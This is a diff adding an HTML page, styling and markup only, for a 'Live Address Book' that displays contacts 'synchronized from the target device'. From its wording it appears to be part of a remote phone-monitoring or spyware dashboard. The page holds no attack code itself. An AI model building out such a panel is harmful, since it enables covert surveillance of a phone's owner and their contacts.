@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Address Book & Contacts - RS Phone</title>
+    <style>
+        body { 
+            background-color: #121212; 
+            color: #ffffff; 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            margin: 0; 
+        }
+        .container { padding: 20px; max-width: 800px; margin: auto; }
+        .header { 
+            border-bottom: 1px solid #333; 
+            padding-bottom: 15px; 
+            margin-bottom: 20px; 
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header h2 { margin: 0 0 5px 0; color: #3498db; }
+        .header p { margin: 0; color: #aaa; font-size: 0.9em; }
+        .back-link { color: #4caf50; text-decoration: none; font-weight: bold; }
+        .back-link:hover { text-decoration: underline; }
+        
+        .search-box {
+            width: 100%;
+            padding: 12px;
+            background: #1e1e1e;
+            border: 1px solid #333;
+            color: white;
+            border-radius: 6px;
+            margin-bottom: 20px;
+            font-size: 16px;
+        }
+        .search-box:focus { outline: none; border-color: #3498db; }
+
+        .contact-card { 
+            background: #1e1e1e; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-bottom: 10px; 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            border-left: 4px solid #3498db;
+        }
+        .contact-info { display: flex; flex-direction: column; }
+        .contact-name { font-size: 1.1em; font-weight: bold; letter-spacing: 0.5px; }
+        .contact-number { color: #aaa; font-size: 0.95em; margin-top: 4px; }
+        
+        .action-btn {
+            background: rgba(52, 152, 219, 0.2);
+            color: #3498db;
+            border: 1px solid #3498db;
+            padding: 8px 12px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        #loading-text { color: #888; font-style: italic; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div>
+                <h2>Live Address Book</h2>
+                <p>Synchronized contacts from the target device.</p>
+            </div>
+            <a href="/dashboard" class="back-link">&larr; Dashboard</a>
+        </div>
+        
+        <input type="text" id="search-input" class="search-box" placeholder="Search by name or number...">
+
+        <div id="contacts-container">
+            <p id="loading-text">Establishing secure connection... Fetching contacts...</p>
+        </div>
+    </div>
+
+    <script src="/static/js/contacts_engine.js"></script>
+</body>
+</html>
